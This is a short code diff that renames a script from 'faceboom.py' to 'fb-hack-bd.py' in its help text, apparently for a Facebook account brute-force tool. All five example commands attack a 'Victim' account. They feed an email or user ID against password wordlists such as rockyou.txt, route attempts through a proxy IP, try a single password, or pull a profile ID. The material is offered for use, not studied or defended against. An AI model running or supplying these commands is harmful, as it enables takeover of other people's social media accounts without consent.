@@ -179,15 +179,15 @@ OPTIONS:
 Examples:
         |
      |--------
-     |1/ python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     |1/ python fb-hack-bd.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     |*2/ python faceboom.py -t 100001013078780 -w /data/data/com.termux/files/home/password.txt
+     |*2/ python fb-hack-bd.py -t 100001013078780 -w /data/data/com.termux/files/home/password.txt
      |--------
-     |3/ python faceboom.py -t Victim@hotmail.com -w \wordlist.txt -p 144.217.101.245:3129
+     |3/ python fb-hack-bd.py -t Victim@hotmail.com -w \wordlist.txt -p 144.217.101.245:3129
      |--------
-     |4/ python faceboom.py -t Victim@gmail.com -s 1234567
+     |4/ python fb-hack-bd.py -t Victim@gmail.com -s 1234567
      |--------
-     |5/ python faceboom.py -g https://www.facebook.com/Victim_Profile
+     |5/ python fb-hack-bd.py -g https://www.facebook.com/Victim_Profile
      |--------
 """)
 
